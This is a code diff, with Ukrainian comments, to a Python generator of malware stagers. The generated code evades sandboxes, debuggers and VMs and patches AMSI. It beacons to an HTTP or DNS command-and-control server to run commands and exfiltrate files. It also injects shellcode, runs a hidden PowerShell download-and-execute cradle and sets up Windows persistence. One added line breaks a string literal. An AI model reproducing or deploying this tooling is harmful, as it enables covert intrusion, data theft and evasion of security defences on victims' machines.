@@ -53,9 +53,10 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "import string", 
         "import subprocess", 
         "import socket", 
-        "import json as json_stager_module"
+        "import json as json_stager_module" # json з псевдонімом, щоб уникнути конфліктів
     ])
     
+    # Умовні імпорти залежно від архетипу та налаштувань
     if archetype_name == "demo_c2_beacon_payload" or archetype_name == "dns_beacon_c2_concept":
         stager_code_lines.extend(["import urllib.request", "import urllib.error"])
 
@@ -63,31 +64,34 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
     if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64", "windows_simple_persistence_stager"] or \
        enable_evasion_checks or enable_amsi_bypass_concept or enable_disk_size_check:
         needs_ctypes = True
-        stager_code_lines.append("import ctypes")
+        if "import ctypes" not in stager_code_lines: stager_code_lines.append("import ctypes")
 
-    # Умовний імпорт shutil для Linux/macOS disk check або Linux shellcode
+
     needs_shutil = False
-    if (os.name != 'nt' and enable_disk_size_check): # shutil потрібен для disk_usage на POSIX
+    # shutil потрібен для disk_usage на POSIX в ec_runtime
+    if (enable_disk_size_check and os.name != 'nt'): 
         needs_shutil = True
     
-    if needs_shutil and "import shutil" not in stager_code_lines: # Перевірка, щоб не дублювати
+    if needs_shutil and "import shutil" not in stager_code_lines:
          stager_code_lines.append("import shutil")
 
-
     if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
-        stager_code_lines.append("import mmap as mmap_module")
+        if "import mmap as mmap_module" not in stager_code_lines: # mmap з псевдонімом
+            stager_code_lines.append("import mmap as mmap_module")
     
     stager_code_lines.append("")
 
+    # Імена функцій для runtime (можуть бути обфусковані пізніше в payload_generator/logic.py)
     decode_func_name_runtime = "dx_runtime"
     evasion_func_name_runtime = "ec_runtime"
     execute_func_name_runtime = "ex_runtime"
 
+    # Тіла функцій dx_runtime, ec_runtime, ex_runtime та блок __main__
     stager_code_lines.extend([
         f"def {decode_func_name_runtime}(b64_data, key_str):",
         "    try:",
         "        temp_decoded_bytes = base64.b64decode(b64_data.encode('utf-8'))",
-        "        temp_decoded_str = temp_decoded_bytes.decode('latin-1')", 
+        "        temp_decoded_str = temp_decoded_bytes.decode('latin-1')",
         "    except Exception as e_decode_rt: return f\"DECODE_ERROR_RUNTIME: {{str(e_decode_rt)}}\"",
         "    o_chars = []",
         "    for i_char_idx in range(len(temp_decoded_str)):",
@@ -99,17 +103,17 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "    indicators = []",
         "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
         "    try:",
-        "        current_user = os.getlogin().lower()", # Потребує import os
+        "        current_user = os.getlogin().lower()",
         "        if current_user in common_sandbox_users: indicators.append('common_username_detected_rt')",
         "    except Exception: pass",
         "    try:",
-        "        if os.name == 'nt':", # Потребує import os
-        "            kernel32_ev_dbg = ctypes.windll.kernel32", # Потребує import ctypes
+        "        if os.name == 'nt':",
+        "            kernel32_ev_dbg = ctypes.windll.kernel32",
         "            if kernel32_ev_dbg.IsDebuggerPresent() != 0:",
         "                indicators.append('debugger_present_win_rt')",
         "    except Exception: pass",
         "    try:",
-        "        sleep_duration_seconds = random.uniform(1.8, 3.3)", # Потребує import random, time
+        "        sleep_duration_seconds = random.uniform(1.8, 3.3)",
         "        time_before_sleep = time.monotonic()",
         "        time.sleep(sleep_duration_seconds)",
         "        time_after_sleep = time.monotonic()",
@@ -123,45 +127,45 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\", \"/usr/bin/VBoxClient\", \"/opt/VBoxGuestAdditions-*/init/vboxadd\"",
         "    ]",
         "    for vm_file_path in vm_files_artifacts:",
-        "        if os.path.exists(vm_file_path):", # Потребує import os
+        "        if os.path.exists(vm_file_path):",
         "            indicators.append(f'vm_file_artifact_{os.path.basename(vm_file_path).lower().replace(\".sys\",\"\")}_rt')",
         "            break",
         "    try:",
-        "        hostname = socket.gethostname().lower()", # Потребує import socket
+        "        hostname = socket.gethostname().lower()",
         "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\", \"lab\", \"desktop-\", \"DESKTOP-\"]",
         "        if any(keyword in hostname for keyword in suspicious_host_keywords):",
         "            indicators.append('suspicious_hostname_keyword_rt')",
         "    except Exception: pass",
         "    try:",
-        "        cpu_count = os.cpu_count()", # Потребує import os
+        "        cpu_count = os.cpu_count()",
         "        if cpu_count is not None and cpu_count < 2:",
         "            indicators.append('low_cpu_core_count_rt')",
         "    except Exception: pass",
         "    try:",
-        "        if os.name == 'nt':", # Потребує import os
-        "            class POINT(ctypes.Structure): _fields_ = [(\"x\", ctypes.c_long), (\"y\", ctypes.c_long)]", # Потребує import ctypes
+        "        if os.name == 'nt':",
+        "            class POINT(ctypes.Structure): _fields_ = [(\"x\", ctypes.c_long), (\"y\", ctypes.c_long)]",
         "            pt1 = POINT()",
         "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))",
-        "            time.sleep(random.uniform(0.3, 0.7))", # Потребує import time, random
+        "            time.sleep(random.uniform(0.3, 0.7))",
         "            pt2 = POINT()",
         "            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))",
         "            if pt1.x == pt2.x and pt1.y == pt2.y:",
         "                 indicators.append('no_mouse_activity_win_rt')",
         "    except Exception: pass",
         "    suspicious_processes = ['wireshark.exe', 'procmon.exe', 'procexp.exe', 'ollydbg.exe', 'x64dbg.exe', 'idag.exe', 'idaw.exe', 'fiddler.exe', 'tcpview.exe', 'autoruns.exe']",
-        "    if random.random() < 0.1: indicators.append('simulated_suspicious_process_check_rt')", # Потребує import random
+        "    if random.random() < 0.1: indicators.append('simulated_suspicious_process_check_rt')",
         "",
-        "    if random.random() < 0.08: indicators.append('simulated_api_hook_check_rt')", # Потребує import random
+        "    if random.random() < 0.08: indicators.append('simulated_api_hook_check_rt')",
         "",
-        "    if AMSI_BYPASS_CONCEPT_APPLIED and os.name == 'nt':", # Потребує import os
+        "    if AMSI_BYPASS_CONCEPT_APPLIED and os.name == 'nt':",
         "        print(\"[STAGER_EVASION_AMSI_RUNTIME] Спроба концептуального обходу AMSI...\")",
         "        try:",
-        "            amsi_dll_name_b64_rt = 'YW1zaS5kbGw='",
-        "            amsi_scan_buffer_b64_rt = 'QW1zaVNjYW5CdWZmZXI='",
-        "            amsi_dll_name_rt = base64.b64decode(amsi_dll_name_b64_rt).decode('utf-8')", # Потребує import base64
+        "            amsi_dll_name_b64_rt = 'YW1zaS5kbGw='", # amsi.dll
+        "            amsi_scan_buffer_b64_rt = 'QW1zaVNjYW5CdWZmZXI='", # AmsiScanBuffer
+        "            amsi_dll_name_rt = base64.b64decode(amsi_dll_name_b64_rt).decode('utf-8')",
         "            amsi_scan_buffer_name_rt = base64.b64decode(amsi_scan_buffer_b64_rt).decode('utf-8')",
         "",
-        "            kernel32_amsi_rt = ctypes.WinDLL('kernel32', use_last_error=True)", # Потребує import ctypes
+        "            kernel32_amsi_rt = ctypes.WinDLL('kernel32', use_last_error=True)",
         "            amsi_handle_rt = kernel32_amsi_rt.LoadLibraryA(amsi_dll_name_rt.encode('ascii'))",
         "            if not amsi_handle_rt:",
         "                print(f\"[STAGER_EVASION_AMSI_WARN_RT] Не вдалося завантажити {{amsi_dll_name_rt}}: {{ctypes.get_last_error()}}\")",
@@ -170,7 +174,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                if not amsi_scan_buffer_addr_rt:",
         "                    print(f\"[STAGER_EVASION_AMSI_WARN_RT] Не вдалося отримати адресу {{amsi_scan_buffer_name_rt}}: {{ctypes.get_last_error()}}\")",
         "                else:",
-        "                    patch_code_hex_rt = 'C3'",
+        "                    patch_code_hex_rt = 'C3'", # RET instruction
         "                    patch_byte_rt = bytes.fromhex(patch_code_hex_rt)[0]",
         "                    original_byte_rt = (ctypes.c_char).from_address(amsi_scan_buffer_addr_rt).value",
         "                    print(f\"[STAGER_EVASION_AMSI_SIM_RT] Концептуальний 'патчинг' {{amsi_scan_buffer_name_rt}} за адресою {{hex(amsi_scan_buffer_addr_rt)}}.\")",
@@ -186,8 +190,8 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "        try:",
         "            min_disk_size_gb_threshold_rt = 50",
         "            total_bytes_rt = 0",
-        "            if os.name == 'nt':", # Потребує import os
-        "                free_bytes_available_to_caller_rt = ctypes.c_ulonglong(0)", # Потребує import ctypes
+        "            if os.name == 'nt':",
+        "                free_bytes_available_to_caller_rt = ctypes.c_ulonglong(0)",
         "                total_number_of_bytes_rt = ctypes.c_ulonglong(0)",
         "                total_number_of_free_bytes_rt = ctypes.c_ulonglong(0)",
         "                kernel32_disk_rt = ctypes.windll.kernel32",
@@ -201,7 +205,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                    print(f\"[STAGER_EVASION_DISK_WARN_WIN_RT] Не вдалося отримати розмір диска C:: {{ctypes.WinError()}}\")",
         "            else:", 
         "                try:",
-        "                    disk_usage_stats_rt = shutil.disk_usage('/')", # Потребує import shutil (якщо needs_shutil)
+        "                    disk_usage_stats_rt = shutil.disk_usage('/')", # Потребує import shutil
         "                    total_bytes_rt = disk_usage_stats_rt.total",
         "                except NameError: ",
         "                    print(\"[STAGER_EVASION_DISK_WARN_POSIX_RT] Модуль shutil не імпортовано для перевірки диска.\")",
@@ -227,7 +231,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "",
         f"def {execute_func_name_runtime}(payload_params_json, arch_type):",
         "    try:",
-        "        payload_params = json_stager_module.loads(payload_params_json)", # Потребує import json as json_stager_module
+        "        payload_params = json_stager_module.loads(payload_params_json)",
         "    except Exception as e_json_parse_rt:",
         "        print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка розпаковки параметрів: {{e_json_parse_rt}}\")",
         "        return",
@@ -235,13 +239,13 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         # Логіка для demo_c2_beacon_payload
         "    if arch_type == 'demo_c2_beacon_payload':",
         "        beacon_url = payload_params.get('c2_url')",
-        "        implant_data_rt = {", 
-        "            'implant_id': STAGER_IMPLANT_ID,", # Використовує глобальну змінну стейджера
-        "            'hostname': socket.gethostname(),", # Потребує import socket
-        "            'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown_user',", # Потребує import os
-        "            'os_type': os.name,", # Потребує import os
-        "            'pid': os.getpid(),", # Потребує import os
-        "            'beacon_interval_sec': BEACON_INTERVAL_SEC", # Використовує глобальну змінну стейджера
+        "        implant_data_rt = {",
+        "            'implant_id': STAGER_IMPLANT_ID,",
+        "            'hostname': socket.gethostname(),",
+        "            'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown_user',",
+        "            'os_type': os.name,",
+        "            'pid': os.getpid(),",
+        "            'beacon_interval_sec': BEACON_INTERVAL_SEC",
         "        }",
         "        last_task_result_package_rt = None",
         "        exfil_state_rt = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
@@ -258,7 +262,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                try:",
         "                    chunk_data_rt = exfil_state_rt['file_handle'].read(exfil_state_rt['chunk_size'])",
         "                    if chunk_data_rt:",
-        "                        chunk_b64_rt = base64.b64encode(chunk_data_rt).decode('utf-8')", # Потребує import base64
+        "                        chunk_b64_rt = base64.b64encode(chunk_data_rt).decode('utf-8')",
         "                        exfil_result_rt = {",
         "                            'file_path': exfil_state_rt['file_path'],",
         "                            'chunk_num': exfil_state_rt['current_chunk'],",
@@ -289,8 +293,8 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "",
         "            try:",
         "                print(f\"[PAYLOAD_BEACON_RT] Надсилання маячка на {{beacon_url}} з даними: {{ {k: (v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v) for k,v in current_beacon_payload_rt.items()} }}\")",
-        "                data_encoded_rt = json_stager_module.dumps(current_beacon_payload_rt).encode('utf-8')", # Потребує import json as json_stager_module
-        "                req_rt = urllib.request.Request(beacon_url, data=data_encoded_rt, headers={'Content-Type': 'application/json', 'User-Agent': 'SyntaxBeaconClient/1.0'})", # Потребує import urllib.request
+        "                data_encoded_rt = json_stager_module.dumps(current_beacon_payload_rt).encode('utf-8')",
+        "                req_rt = urllib.request.Request(beacon_url, data=data_encoded_rt, headers={'Content-Type': 'application/json', 'User-Agent': 'SyntaxBeaconClient/1.0'})",
         "                with urllib.request.urlopen(req_rt, timeout=20) as response_rt:",
         "                    response_data_raw_rt = response_rt.read().decode('utf-8')",
         "                    print(f\"[PAYLOAD_BEACON_RT] Відповідь C2 (статус {{response_rt.status}}): {{response_data_raw_rt[:200]}}...\")",
@@ -306,24 +310,24 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                    task_success_rt = False",
         "                    try:",
         "                        if task_type_rt == 'exec_command':",
-        "                            cmd_parts_rt = shlex.split(task_params_str_rt)", # Потребує import shlex (вже є в глобальних імпортах)
+        "                            cmd_parts_rt = shlex.split(task_params_str_rt)",
         "                            print(f\"[PAYLOAD_TASK_EXEC_RT] Виконання команди: {{cmd_parts_rt}}\")",
-        "                            proc_rt = subprocess.run(cmd_parts_rt, capture_output=True, text=True, shell=False, timeout=20, encoding='utf-8', errors='ignore')", # Потребує import subprocess
+        "                            proc_rt = subprocess.run(cmd_parts_rt, capture_output=True, text=True, shell=False, timeout=20, encoding='utf-8', errors='ignore')",
         "                            task_output_rt = f'STDOUT:\\n{{proc_rt.stdout}}\\nSTDERR:\\n{{proc_rt.stderr}}'",
         "                            task_success_rt = proc_rt.returncode == 0",
         "                        elif task_type_rt == 'list_directory':",
         "                            path_to_list_rt = task_params_str_rt if task_params_str_rt else '.'",
         "                            print(f\"[PAYLOAD_TASK_EXEC_RT] Перелік директорії: {{path_to_list_rt}}\")",
-        "                            listed_items_rt = os.listdir(path_to_list_rt)", # Потребує import os
+        "                            listed_items_rt = os.listdir(path_to_list_rt)",
         "                            task_output_rt = f\"Перелік '{{path_to_list_rt}}':\\n\" + \"\\n\".join(listed_items_rt)",
         "                            task_success_rt = True",
         "                        elif task_type_rt == 'get_system_info':",
-        "                            task_output_rt = f'Hostname: {{socket.gethostname()}}\\nOS: {{os.name}}\\nUser: {{implant_data_rt[\"username\"]}}'", # Потребує socket, os
+        "                            task_output_rt = f'Hostname: {{socket.gethostname()}}\\nOS: {{os.name}}\\nUser: {{implant_data_rt[\"username\"]}}'",
         "                            task_success_rt = True",
         "                        elif task_type_rt == 'exfiltrate_file_chunked':",
         "                            file_to_exfil_rt = task_params_str_rt",
         "                            print(f\"[PAYLOAD_TASK_EXFIL_INIT_RT] Ініціалізація ексфільтрації файлу: {{file_to_exfil_rt}}\")",
-        "                            if os.path.exists(file_to_exfil_rt) and os.path.isfile(file_to_exfil_rt):", # Потребує os
+        "                            if os.path.exists(file_to_exfil_rt) and os.path.isfile(file_to_exfil_rt):",
         "                                exfil_state_rt['file_path'] = file_to_exfil_rt",
         "                                exfil_state_rt['file_handle'] = open(file_to_exfil_rt, 'rb')",
         "                                exfil_state_rt['current_chunk'] = 0",
@@ -342,7 +346,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                            if remote_upload_path_rt and file_content_b64_rt:",
         "                                print(f\"[PAYLOAD_TASK_UPLOAD_RT] Завантаження файлу на {{remote_upload_path_rt}} (розмір B64: {{len(file_content_b64_rt)}})\")",
         "                                try:",
-        "                                    decoded_file_content_rt = base64.b64decode(file_content_b64_rt.encode('utf-8'))", # Потребує base64
+        "                                    decoded_file_content_rt = base64.b64decode(file_content_b64_rt.encode('utf-8'))",
         "                                    with open(remote_upload_path_rt, 'wb') as f_upload_rt:",
         "                                        f_upload_rt.write(decoded_file_content_rt)",
         "                                    task_output_rt = f'Файл успішно завантажено на {{remote_upload_path_rt}}.'",
@@ -367,11 +371,11 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                    print(f\"[PAYLOAD_BEACON_RT] Нових завдань від C2 не отримано.\")",
         "                    last_task_result_package_rt = None",
         "",
-        "            except urllib.error.URLError as e_url_rt:", # Потребує urllib.error
+        "            except urllib.error.URLError as e_url_rt:",
         "                print(f\"[PAYLOAD_BEACON_ERROR_RT] Помилка мережі (URLError) під час відправки маячка: {{e_url_rt}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
-        "            except socket.timeout:", # Потребує socket
+        "            except socket.timeout:",
         "                print(f\"[PAYLOAD_BEACON_ERROR_RT] Таймаут під час відправки маячка. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
-        "            except json_stager_module.JSONDecodeError as e_json_rt:", # Потребує json as json_stager_module
+        "            except json_stager_module.JSONDecodeError as e_json_rt:",
         "                response_data_raw_local_rt = response_data_raw_rt if 'response_data_raw_rt' in locals() else 'N/A'",
         "                print(f\"[PAYLOAD_BEACON_ERROR_RT] Помилка декодування JSON відповіді від C2: {{e_json_rt}}. Відповідь: {{response_data_raw_local_rt}}\")",
         "            except Exception as e_beacon_loop_rt:",
@@ -379,18 +383,18 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "            ",
         "            if not next_task_rt and not exfil_state_rt['active']:",
         "                print(f\"[PAYLOAD_BEACON_RT] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
-        "                time.sleep(BEACON_INTERVAL_SEC)", # Потребує time
+        "                time.sleep(BEACON_INTERVAL_SEC)",
         "            elif exfil_state_rt['active']:",
-        "                 time.sleep(random.uniform(0.1, 0.5))", # Потребує time, random
+        "                 time.sleep(random.uniform(0.1, 0.5))",
         # Логіка для dns_beacon_c2_concept
         "    elif arch_type == 'dns_beacon_c2_concept':",
         "        c2_zone_rt = payload_params.get('dns_zone')",
-        "        dns_prefix_rt = DNS_BEACON_SUBDOMAIN_PREFIX", 
+        "        dns_prefix_rt = DNS_BEACON_SUBDOMAIN_PREFIX",
         "        implant_id_dns_rt = STAGER_IMPLANT_ID",
         "        beacon_interval_rt = DNS_BEACON_INTERVAL_SEC",
         "        last_task_result_dns_rt = None",
         "",
-        "        def encode_data_for_dns_rt(data_dict):", # Локальна функція
+        "        def encode_data_for_dns_rt(data_dict):",
         "            try:",
         "                json_data_rt = json_stager_module.dumps(data_dict, separators=(',', ':'))",
         "                encoded_full_rt = base64.b32encode(json_data_rt.encode('utf-8')).decode('utf-8').rstrip('=').lower()",
@@ -469,7 +473,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                return",
         "            shellcode_bytes_rt = bytes.fromhex(shellcode_hex_rt)",
         "            print(f\"[PAYLOAD_RUNTIME_INFO] Розмір шеллкоду: {{len(shellcode_bytes_rt)}} байт.\")",
-        "            kernel32_rt_shell = ctypes.windll.kernel32", # Потребує ctypes
+        "            kernel32_rt_shell = ctypes.windll.kernel32",
         "            MEM_COMMIT_RT = 0x00001000",
         "            MEM_RESERVE_RT = 0x00002000",
         "            PAGE_EXECUTE_READWRITE_RT = 0x40",
@@ -487,7 +491,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "            handle_rt = kernel32_rt_shell.CreateThread(None, 0, ctypes.c_void_p(ptr_rt), None, 0, ctypes.byref(thread_id_rt))",
         "            if not handle_rt:",
         "                print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка CreateThread: {{ctypes.WinError()}}\")",
-        "                kernel32_rt_shell.VirtualFree(ctypes.c_void_p(ptr_rt), 0, 0x00008000)",
+        "                kernel32_rt_shell.VirtualFree(ctypes.c_void_p(ptr_rt), 0, 0x00008000)", # MEM_RELEASE
         "                return",
         "            print(f\"[PAYLOAD_RUNTIME_SUCCESS] Шеллкод запущено в потоці ID: {{thread_id_rt.value}}. Handle: {{handle_rt}}.\")",
         "        except Exception as e_shellcode_win_rt:",
@@ -502,7 +506,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                return",
         "            shellcode_bytes_rt = bytes.fromhex(shellcode_hex_rt)",
         "            print(f\"[PAYLOAD_RUNTIME_INFO] Розмір шеллкоду: {{len(shellcode_bytes_rt)}} байт.\")",
-        "            libc_rt = ctypes.CDLL(None)", # Потребує ctypes
+        "            libc_rt = ctypes.CDLL(None)",
         "            PROT_READ_RT, PROT_WRITE_RT, PROT_EXEC_RT = 0x1, 0x2, 0x4",
         "            MAP_PRIVATE_RT, MAP_ANONYMOUS_RT = 0x02, 0x20",
         "            mmap_syscall_rt = libc_rt.mmap",
@@ -510,9 +514,9 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "            mmap_syscall_rt.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]",
         "            print(\"[PAYLOAD_RUNTIME_INFO] Виділення пам'яті через mmap...\")",
         "            mem_ptr_rt = mmap_syscall_rt(None, len(shellcode_bytes_rt), PROT_READ_RT | PROT_WRITE_RT | PROT_EXEC_RT, MAP_PRIVATE_RT | MAP_ANONYMOUS_RT, -1, 0)",
-        "            if mem_ptr_rt == -1 or mem_ptr_rt == 0:",
+        "            if mem_ptr_rt == -1 or mem_ptr_rt == 0: # (void*)-1
         "                err_no_rt = ctypes.get_errno()",
-        "                print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка mmap: {{os.strerror(err_no_rt)}} (errno: {{err_no_rt}})\")", # Потребує os
+        "                print(f\"[PAYLOAD_RUNTIME_ERROR] Помилка mmap: {{os.strerror(err_no_rt)}} (errno: {{err_no_rt}})\")",
         "                return",
         "            print(f\"[PAYLOAD_RUNTIME_INFO] Пам'ять виділено за адресою: {{hex(mem_ptr_rt)}}.\")",
         "            ctypes.memmove(mem_ptr_rt, shellcode_bytes_rt, len(shellcode_bytes_rt))",
@@ -530,11 +534,11 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "        try:",
         "            ps_command_to_run_rt = f\"IEX (New-Object Net.WebClient).DownloadString('{payload_params.get('ps_url')}')\"",
         "            full_command_rt = ['powershell.exe']",
-        "            if POWERSHELL_EXEC_ARGS:", # Використовує глобальну змінну стейджера
+        "            if POWERSHELL_EXEC_ARGS:",
         "                full_command_rt.extend(POWERSHELL_EXEC_ARGS.split())",
         "            full_command_rt.extend(['-Command', ps_command_to_run_rt])",
         "            print(f\"[PAYLOAD_RUNTIME_INFO] Виконання команди: {{' '.join(full_command_rt)}}\")",
-        "            result_rt = subprocess.run(full_command_rt, capture_output=True, text=True, check=False)", # Потребує subprocess
+        "            result_rt = subprocess.run(full_command_rt, capture_output=True, text=True, check=False, creationflags=0x08000000 if os.name == 'nt' else 0)", # CREATE_NO_WINDOW for Windows
         "            if result_rt.returncode == 0:",
         "                print(f\"[PAYLOAD_RUNTIME_SUCCESS] PowerShell скрипт успішно виконано. STDOUT (перші 100 символів): {{result_rt.stdout[:100]}}...\")",
         "            else:",
@@ -549,7 +553,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "        print(f\"[PAYLOAD_PERSISTENCE_RUNTIME] Встановлення персистентності. Метод: {{method_rt}}, Команда: '{{command_rt}}', Ім'я: '{{name_rt}}'\")",
         "        persist_cmd_parts_rt = []",
         "        success_msg_rt = ''",
-        "        if os.name != 'nt':", # Потребує os
+        "        if os.name != 'nt':",
         "            print(\"[PAYLOAD_PERSISTENCE_ERROR_RT] Цей архетип призначений тільки для Windows.\")",
         "            return",
         "        try:",
@@ -565,7 +569,7 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "                return",
         "",
         "            print(f\"[PAYLOAD_PERSISTENCE_EXEC_RT] Виконання команди: {{' '.join(persist_cmd_parts_rt)}}\")",
-        "            proc_persist_rt = subprocess.run(persist_cmd_parts_rt, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore')", # Потребує subprocess
+        "            proc_persist_rt = subprocess.run(persist_cmd_parts_rt, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore', creationflags=0x08000000)", # CREATE_NO_WINDOW
         "            if proc_persist_rt.returncode == 0:",
         "                print(f\"[PAYLOAD_PERSISTENCE_SUCCESS_RT] {{success_msg_rt}}\")",
         "                print(f\"  STDOUT: {{proc_persist_rt.stdout}}\")",
@@ -594,7 +598,6 @@ def generate_stager_code_logic(archetype_name: str, obfuscation_key: str, obfusc
         "    print(\"[STAGER_MAIN] Стейджер завершив роботу.\")"
     ])
     
-    final_stager_code = "\n".join(line for line in stager_code_lines if line.strip() or line == "")
+    final_stager_code = "\n".join(line for line in stager_code_lines if line is not None) # Видаляємо None, що могли з'явитися від умовного додавання
     log_messages.append(f"[STAGER_TEMPLATE_SUCCESS] Код для архетипу {archetype_name} згенеровано.")
     return final_stager_code
-
